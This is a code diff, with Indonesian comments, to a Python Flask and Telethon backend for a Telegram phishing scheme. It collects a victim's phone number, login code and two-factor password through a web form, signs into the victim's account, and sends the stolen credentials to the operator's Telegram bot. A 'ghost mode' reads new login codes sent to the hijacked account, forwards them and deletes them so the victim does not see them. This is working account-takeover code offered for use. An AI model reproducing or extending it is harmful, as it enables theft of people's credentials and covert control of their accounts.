@@ -7,7 +7,6 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, P
 app = Flask(__name__)
 CORS(app)
 
-# Variabel Lingkungan
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -16,27 +15,22 @@ CHAT_ID = os.getenv("CHAT_ID")
 SESSION_DIR = '/tmp/sessions/'
 if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)
 
+# Penyimpanan Sesi Sementara
 active_sessions = {}
 
-def send_bot(text, msg_id=None, show_otp=False, nomor=None):
-    """Fungsi kirim/edit pesan dengan tombol OTP."""
+def send_bot(text, show_otp=False, nomor=None):
+    """Kirim pesan baru ke bot (Hanya dipanggil saat data sudah lengkap)."""
     payload = {
         "chat_id": CHAT_ID,
         "text": text,
         "parse_mode": "Markdown"
     }
-    
     if show_otp and nomor:
         payload["reply_markup"] = {
             "inline_keyboard": [[{"text": "otp", "callback_data": f"ghost_{nomor}"}]]
         }
-
-    if msg_id:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-        payload["message_id"] = msg_id
-    else:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        
+    
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
         r = requests.post(url, json=payload).json()
         return r.get("result", {}).get("message_id")
@@ -56,16 +50,14 @@ async def register():
     await client.connect()
     
     try:
+        # STEP 1: Pancing OTP (Bot BELUM kirim pesan apa-apa)
         sent_code = await client.send_code_request(nomor)
-        # Pesan Awal: Status Pancingan (Satu Pesan Dimulai)
-        text = f"⚠️ **Target Masuk!**\nNama Web: {nama}\nNomor: `{nomor}`\n\n_Menunggu OTP dari web..._"
-        msg_id = send_bot(text)
         
         active_sessions[nomor] = {
             "client": client,
             "hash": sent_code.phone_code_hash,
             "nama": nama,
-            "msg_id": msg_id
+            "msg_id": None # Belum ada pesan
         }
         return jsonify({"status": "sent"}), 200
     except Exception as e:
@@ -87,28 +79,29 @@ async def verify_otp():
     client = s["client"]
 
     try:
-        # Cek OTP
+        # STEP 2: Coba Login
         await client.sign_in(nomor, otp, phone_code_hash=s["hash"])
         
-        # JIKA SUKSES (Tanpa F2) -> Edit Pesan Awal (Gambar 4)
+        # JIKA LOGIN SUKSES (Tanpa 2FA) -> BARU KIRIM PESAN KE BOT
         text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: None\nOTP: {otp}"
-        send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
+        msg_id = send_bot(text, show_otp=True, nomor=nomor)
+        active_sessions[nomor]['msg_id'] = msg_id # Simpan ID pesan untuk ghost mode
+        
         return jsonify({"status": "success"}), 200
 
     except SessionPasswordNeededError:
-        # Update pesan ke bot bahwa target butuh 2FA
-        text = f"⚠️ **Target Butuh 2FA**\nNama: {s['nama']}\nNomor: `{nomor}`\nStatus: _Input Sandi di Web..._"
-        send_bot(text, msg_id=s["msg_id"])
-        
+        # JIKA BUTUH SANDI -> Web minta sandi, Bot masih diam.
         if sandi:
             try:
                 await client.sign_in(password=sandi)
-                # JIKA SANDI BENAR -> Edit Pesan Awal Jadi Lengkap
+                # JIKA SANDI BENAR -> BARU KIRIM PESAN LENGKAP KE BOT
                 text = f"Nama: {s['nama']}\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP: {otp}"
-                send_bot(text, msg_id=s["msg_id"], show_otp=True, nomor=nomor)
+                msg_id = send_bot(text, show_otp=True, nomor=nomor)
+                active_sessions[nomor]['msg_id'] = msg_id
                 return jsonify({"status": "success"}), 200
             except PasswordHashInvalidError:
                 return jsonify({"status": "error", "message": "Kata sandi salah!"}), 400
+        
         return jsonify({"status": "need_2fa"}), 200
     except PhoneCodeInvalidError:
         return jsonify({"status": "error", "message": "OTP Salah!"}), 400
@@ -127,17 +120,18 @@ async def webhook():
 
 async def ghost_mode(nomor):
     s = active_sessions.get(nomor)
-    if not s: return
-    client = s["client"]
+    if not s or not s['msg_id']: return
+    client = s['client']
     
     @client.on(events.NewMessage(from_users=777000))
     async def handler(event):
         match = re.search(r'\b\d{5}\b', event.raw_text)
         if match:
             otp_baru = match.group()
-            # Kirim pesan baru khusus OTP yang diintip sesuai video
-            text = f"✅ **OTP Ditemukan!**\nNomor: `{nomor}`\nKode: `{otp_baru}`"
-            send_bot(text) # Kirim pesan baru agar tidak menumpuk di laporan lama
+            # Kirim pesan baru berisi OTP intipan (Sesuai video)
+            text = f"✅ **OTP Baru Ditemukan!**\nNomor: `{nomor}`\nKode: `{otp_baru}`"
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                          json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
             await event.delete()
 
     await client.run_until_disconnected()
